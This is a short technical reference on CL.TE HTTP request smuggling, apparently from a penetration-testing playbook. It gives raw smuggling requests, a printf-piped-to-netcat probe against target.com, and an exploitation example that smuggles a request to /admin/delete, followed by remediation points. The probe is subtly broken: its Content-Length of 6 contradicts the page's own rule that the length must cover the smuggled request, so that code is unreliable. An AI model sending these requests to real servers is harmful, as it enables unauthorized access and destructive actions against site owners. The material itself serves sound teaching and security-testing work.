# CL.TE — Content-Length / Transfer-Encoding Discrepancy

## Summary
The front-end proxy uses the Content-Length header to determine the request body boundary, while the back-end server uses Transfer-Encoding: chunked. This allows an attacker to smuggle a request prefix past the front-end.

## How It Works

```
Front-end reads Content-Length: 13 → consumes 13 bytes
Back-end reads Transfer-Encoding: chunked → processes chunks

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end sees 13 bytes of body (everything after the blank line) and forwards it. The back-end sees the chunk terminator "0\r\n\r\n" and processes "SMUGGLED" as the next request.

## Detection

```bash
# Send CL.TE probe over a keep-alive connection
{
  printf "POST / HTTP/1.1\r\n"
  printf "Host: target.com\r\n"
  printf "Content-Length: 6\r\n"
  printf "Transfer-Encoding: chunked\r\n"
  printf "Connection: keep-alive\r\n"
  printf "\r\n"
  printf "0\r\n"
  printf "\r\n"
  printf "GET /404 HTTP/1.1\r\n"
  printf "Host: target.com\r\n"
  printf "\r\n"
} | nc -w 5 target.com 80
```

If the response includes a 404 for /404 (or the smuggled path), CL.TE is confirmed.

## Confirmed Exploitation

Once CL.TE is confirmed, smuggle arbitrary requests:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: [calculated]
Transfer-Encoding: chunked

0

GET /admin/delete HTTP/1.1
Host: target.com
```

### Calculating Content-Length
The Content-Length value must equal the size of the chunk body (including the "0\r\n\r\n" terminator) plus the smuggled request.

## Remediation
- Front-end must reject or normalise any request with both Content-Length and Transfer-Encoding
- Use HTTP/2 end-to-end to eliminate HTTP/1.1 framing ambiguities
- Configure back-end to ignore Transfer-Encoding when Content-Length is present
